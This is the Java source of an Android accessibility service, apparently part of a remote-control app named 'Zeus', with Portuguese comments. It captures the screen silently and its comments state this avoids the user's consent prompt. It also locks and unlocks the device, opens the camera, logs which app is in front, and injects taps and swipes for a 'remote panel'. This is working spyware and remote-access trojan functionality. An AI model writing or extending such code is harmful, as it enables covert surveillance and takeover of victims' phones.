package com.zeusmob.app.service;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Path;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;

/**
 * ZeusAccessibilityService
 *
 * ▸ Captura de tela silenciosa — AccessibilityService.takeScreenshot() (API 30+).
 *   Não usa MediaProjection. Não exibe "Iniciar Transmissão" ao usuário.
 *
 * ▸ Bloqueio / Desbloqueio de tela via GLOBAL_ACTION_LOCK_SCREEN e gestos.
 *
 * ▸ Abertura de câmera (via Intent) e outros comandos remotos.
 */
public class ZeusAccessibilityService extends AccessibilityService {

    private static final String TAG = "ZeusAccessibility";

    /** Static singleton — set on connect, cleared on destroy */
    public static ZeusAccessibilityService instance;

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes       = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType     = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags            = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                              | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                              | AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.d(TAG, "ZeusAccessibilityService CONECTADO");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence pkg = event.getPackageName();
            if (pkg != null) Log.d(TAG, "Janela ativa: " + pkg);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "ZeusAccessibilityService interrompido");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        instance = null;
        return true;
    }

    // ── Silent Screen Capture (API 30+) ──────────────────────────

    /**
     * Captura a tela silenciosamente, sem diálogo de MediaProjection.
     * Funciona em API 30+ (Android 11+).
     */
    public void captureScreenSilently(int displayId, ScreenCaptureCallback callback) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "captureScreenSilently requer Android 11+ (API 30)");
            if (callback != null) callback.onCapture(null);
            return;
        }

        takeScreenshot(
            displayId,
            getMainExecutor(),
            new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult result) {
                    Bitmap bmp = Bitmap.wrapHardwareBuffer(
                        result.getHardwareBuffer(),
                        result.getColorSpace()
                    );
                    result.getHardwareBuffer().close();
                    Log.d(TAG, "Screenshot silencioso capturado");
                    new Handler(Looper.getMainLooper()).post(() -> {
                        if (callback != null) callback.onCapture(bmp);
                    });
                }

                @Override
                public void onFailure(int errorCode) {
                    Log.w(TAG, "Screenshot falhou — código: " + errorCode);
                    if (callback != null) callback.onCapture(null);
                }
            }
        );
    }

    public interface ScreenCaptureCallback {
        void onCapture(Bitmap bitmap);
    }

    // ── Lock Screen ───────────────────────────────────────────────

    /**
     * Bloqueia a tela imediatamente.
     * Usa GLOBAL_ACTION_LOCK_SCREEN (API 28+); sem interação do usuário.
     */
    public void lockScreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            boolean ok = performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
            Log.d(TAG, "lockScreen() via GLOBAL_ACTION_LOCK_SCREEN — ok=" + ok);
        } else {
            Log.w(TAG, "GLOBAL_ACTION_LOCK_SCREEN requer API 28+");
        }
    }

    // ── Unlock Screen ─────────────────────────────────────────────

    /**
     * Tenta acordar a tela e deslizar para cima (swipe-to-unlock).
     * Funciona quando não há PIN/Senha (apenas "deslizar").
     * Se houver PIN, será necessário digitar via AccessibilityNodeInfo.
     */
    public void unlockScreen() {
        Log.d(TAG, "unlockScreen() — acordando e fazendo swipe");

        // 1. Tentar acordar via keyevent Power
        try {
            Runtime.getRuntime().exec(new String[]{ "input", "keyevent", "26" });
        } catch (Exception e) {
            Log.w(TAG, "keyevent 26 falhou: " + e.getMessage());
        }

        // 2. Aguardar 800 ms e fazer swipe de baixo para cima
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            swipeToUnlock();
        }, 800);
    }

    private void swipeToUnlock() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            Log.w(TAG, "dispatchGesture requer API 24+");
            return;
        }

        DisplayMetrics dm = getResources().getDisplayMetrics();
        int screenW = dm.widthPixels;
        int screenH = dm.heightPixels;

        Path path = new Path();
        path.moveTo(screenW / 2f, screenH * 0.85f);   // start — bottom
        path.lineTo(screenW / 2f, screenH * 0.25f);   // end   — upper quarter

        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, 600);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(stroke)
            .build();

        dispatchGesture(gesture, new GestureResultCallback() {
            @Override
            public void onCompleted(GestureDescription gestureDescription) {
                Log.d(TAG, "swipeToUnlock concluído");
            }
            @Override
            public void onCancelled(GestureDescription gestureDescription) {
                Log.w(TAG, "swipeToUnlock cancelado");
            }
        }, null);
    }

    // ── Camera ────────────────────────────────────────────────────

    /**
     * Abre a câmera frontal ou traseira como nova activity.
     * Para captura silenciosa (sem UI), utilize Camera2 API em ZeusCameraService.
     */
    public void openCamera(boolean front) {
        Log.d(TAG, "openCamera — frontal=" + front);
        try {
            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            if (front) {
                intent.putExtra("android.intent.extras.LENS_FACING_FRONT", 1);
                intent.putExtra("android.intent.extras.CAMERA_FACING",
                    android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT);
            }
            getApplicationContext().startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "openCamera falhou: " + e.getMessage());
        }
    }

    // ── Remote gesture (click at X,Y) ────────────────────────────

    /**
     * Clica em coordenada absoluta na tela — usado pelo painel remoto.
     */
    public void tapAt(float x, float y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Path path = new Path();
        path.moveTo(x, y);

        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, 50);

        dispatchGesture(
            new GestureDescription.Builder().addStroke(stroke).build(),
            null, null
        );
    }

    /** Swipe from (x1,y1) to (x2,y2) over duration ms */
    public void swipe(float x1, float y1, float x2, float y2, long durationMs) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);

        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, durationMs);

        dispatchGesture(
            new GestureDescription.Builder().addStroke(stroke).build(),
            null, null
        );
    }
}
